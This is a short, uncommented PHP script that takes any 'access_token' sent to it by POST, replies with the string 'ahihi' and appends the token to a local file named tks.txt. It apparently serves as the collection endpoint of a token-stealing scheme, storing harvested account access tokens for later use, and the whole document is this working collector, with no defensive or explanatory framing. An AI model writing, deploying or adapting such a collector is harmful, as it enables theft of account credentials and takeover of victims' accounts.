<?php 
if(isset($_POST['access_token'])){
    echo 'ahihi';
    $fp = fopen('tks.txt', 'a+');
	fwrite($fp, $_POST['access_token']."\n");
	fclose($fp);
}
?>